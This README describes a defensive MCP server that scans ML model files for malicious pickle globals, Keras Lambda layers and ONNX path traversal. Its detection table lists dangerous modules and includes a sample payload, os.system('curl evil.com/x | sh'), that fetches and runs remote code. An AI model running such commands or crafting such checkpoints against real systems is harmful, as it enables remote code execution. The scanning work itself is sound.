# @guardbee/mcp-model-scanner

**🇬🇧 English** | [🇹🇷 Türkçe](TR.md)

An MCP (Model Context Protocol) server that scans ML model files for **supply-chain** risks — the file itself, not the code that loads it.

Most "AI security" tooling looks at your integration code or the prompts flowing through it. This package looks at the artifact you (or a teammate, or a `pip install`) downloaded from Hugging Face, a registry, or an S3 bucket: a `.pt`/`.pth`/`.pkl` checkpoint is a **pickle** file, and unpickling isn't just data deserialization — it can call arbitrary Python code the moment the file is loaded (`torch.load()`, `pickle.load()`, etc). A malicious checkpoint is a real, well-documented attack vector, not a hypothetical one.

> This package sends usage telemetry by default (tool name + short parameters, the scanned file's contents are never included — see [`@guardbee/mcp-telemetry`](../telemetry/README.md)). Disable with `GUARDBEE_TELEMETRY=0`.

```
Claude ──► model-scanner ──► Your model files
              │
              ├─ .pt / .pth / .ckpt   → PyTorch zip container: extract data.pkl, disassemble
              ├─ .pkl / .pickle / .bin → raw pickle stream, disassemble directly
              ├─ .safetensors         → header structure + disguised-binary check
              ├─ .h5 / .hdf5 / .keras → Keras Lambda-layer RCE heuristic
              └─ .onnx                → external_data path-traversal heuristic
```

---

## Why pickle is the core of this

Pickle streams are bytecode for a tiny stack VM. A `GLOBAL`/`STACK_GLOBAL` opcode names any importable Python object; the very next opcodes typically call it. There is nothing stopping a crafted pickle from naming `os.system` or `subprocess.Popen` instead of a tensor-rebuilding function — and `pickle.load()`/`torch.load()` will happily resolve and invoke it. This is the same technique tools like `picklescan`/`fickling`/Hugging Face's Picklescan integration are built around.

This package implements a from-scratch pickle opcode disassembler (protocols 0–5, including the newer `STACK_GLOBAL` encoding used by protocol 4+) rather than shelling out to Python or using a regex — the opcode stream has to be walked correctly byte-by-byte to know where each `GLOBAL` reference actually is, and a regex over raw bytes would both miss and misfire constantly.

Every `GLOBAL`/`STACK_GLOBAL`/`INST` reference found is checked against:
- a **denylist** of modules with no legitimate reason to appear in a tensor deserialization path (`os`, `subprocess`, `socket`, `builtins.eval`, `ctypes`, …) → reported as **critical/high**
- an **allowlist** of the modules real ML frameworks actually reference (`numpy`, `torch`, `sklearn`, `collections`, …) → silently safe, no noise
- anything else → reported as **medium** ("unknown", not "malicious" — for manual review, keeping the false-positive rate low)

For PyTorch's default zip-based checkpoint format, the scanner reads the ZIP central directory directly off disk (with Zip64 support) to locate and extract just the small `data.pkl` metadata entry — it never loads a multi-gigabyte checkpoint fully into memory.

---

## Features

- **Real pickle opcode disassembly** — not a regex, not a Python subprocess call
- **31 dangerous-global rules** across 6 risk categories (code-execution, process-execution, network, filesystem, reflection, deserialization)
- **PyTorch zip container support** (including Zip64) — extracts and scans `data.pkl` without loading the full checkpoint
- **`.safetensors` structural validation** — malformed/out-of-bounds headers, and detection of a pickle/zip disguised with a `.safetensors` extension
- **Keras `.h5`/`.keras` Lambda-layer RCE heuristic**
- **ONNX `external_data` path-traversal heuristic**
- Bounded reads everywhere (10MB pickle prefix, 100MB safetensors header cap, 50MB zip-entry cap) — safe against decompression bombs and won't OOM on huge model files
- SARIF 2.1.0 output — CI/CD integration (GitHub Code Scanning, etc.)
- Config file support via `guardbee.yml`
- 45 unit tests, plus end-to-end verification against real CPython-`pickle`-produced and `zipfile`-produced fixtures (not just hand-built ones)

---

## Quick Start

### Claude Desktop / MCP Client

```json
{
  "mcpServers": {
    "guardbee-model-scanner": {
      "command": "npx",
      "args": ["-y", "@guardbee/mcp-model-scanner"]
    }
  }
}
```

### CLI (CI/CD)

```bash
npx @guardbee/mcp-model-scanner scan ./models --fail-on=high --format=sarif > results.sarif
```

---

## MCP Tools

| Tool | Description |
|------|----------|
| `scan_file` | Scans a single model file |
| `scan_directory` | Recursively scans a directory of model files |
| `list_patterns` | Lists the dangerous-global catalog by risk category |

---

## What it catches

| Format | Check | Severity | Example |
|---|---|---|---|
| pickle / PyTorch | Reference to `os`, `posix`, `nt`, `subprocess`, `socket`, `ctypes`, `runpy`, `pty.spawn`, `platform.popen`, `commands` | critical | `os.system('curl evil.com/x \| sh')` |
| pickle / PyTorch | `builtins.eval`/`exec`/`compile`/`__import__`, `pickle.loads`, `marshal.loads` | critical | recursive/nested payload, or a direct eval |
| pickle / PyTorch | `builtins.getattr`/`open`, `shutil.*`, `importlib.*`, `requests.*`, `webbrowser.open`, `urllib*.urlopen` | high | exfiltration, SSRF, file read/write |
| safetensors | Header starts with a pickle/zip signature instead of a length | critical | a `.pkl` renamed to `.safetensors` |
| safetensors | Tensor `data_offsets` exceed the actual data section | high | a parser reading out-of-bounds |
| safetensors | Invalid/oversized header length, non-JSON header | high | corrupt or adversarially crafted header |
| Keras .h5/.keras | `class_name: "Lambda"` in the model config | critical | marshalled-function RCE on load |
| ONNX | `external_data` location containing `..` | high | path traversal to an arbitrary file |

Full dangerous-global catalog: run the `list_patterns` tool, or see [`src/dangerousGlobals.ts`](src/dangerousGlobals.ts).

These are **heuristic** findings tuned for a low false-positive rate — HDF5 and ONNX in particular are complex binary/protobuf formats scanned via a bounded text-pattern search rather than a full structural parse. Every finding should still be reviewed; a clean scan is not a formal safety proof.

---

## Configuration (`guardbee.yml`)

```yaml
model-scanner:
  fail-on: high       # any | critical | high | medium | low | none
  max-files: 2000
  exclude:
    - "fixtures/"
```

---

## Limitations (by design)

- Only the first 10MB of a raw (non-zip) pickle stream is scanned — dangerous globals must be referenced before their instances in a pickle stream, so this bound is a reasonable trade-off against loading huge legacy checkpoints fully into memory.
- ZIP extraction supports STORED and DEFLATE only (covers the default PyTorch checkpoint format).
- HDF5/ONNX checks are pattern-based on a bounded prefix, not a full structural/protobuf parse.
- This scans the **file**, not runtime behavior — it does not execute or sandbox anything.

---

## Development

```bash
npm run build
npm test             # 45 unit tests
```

---

## License

MIT — [GuardBee](https://guardbee.ai)
